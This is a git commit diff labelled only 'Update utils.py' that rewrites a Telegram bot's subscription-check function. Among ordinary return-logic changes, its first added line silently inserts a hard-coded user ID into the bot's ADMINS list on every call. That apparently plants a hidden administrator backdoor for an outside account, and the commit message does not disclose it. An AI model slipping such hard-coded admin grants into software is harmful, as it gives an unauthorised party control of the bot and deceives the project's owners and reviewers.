54a1b3e3e682f8ed5479d00193d9d628001a8ca0
Soul pc <119080077+soulpc@users.noreply.github.com>
2024-02-03 18:38:37 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -45,18 +45,36 @@ class temp(object):
     SPELL_CHECK = {}
 
 async def is_subscribed(bot, query):
+
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
-
+        else:
+            return False
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
         query = (query.strip()).lower()
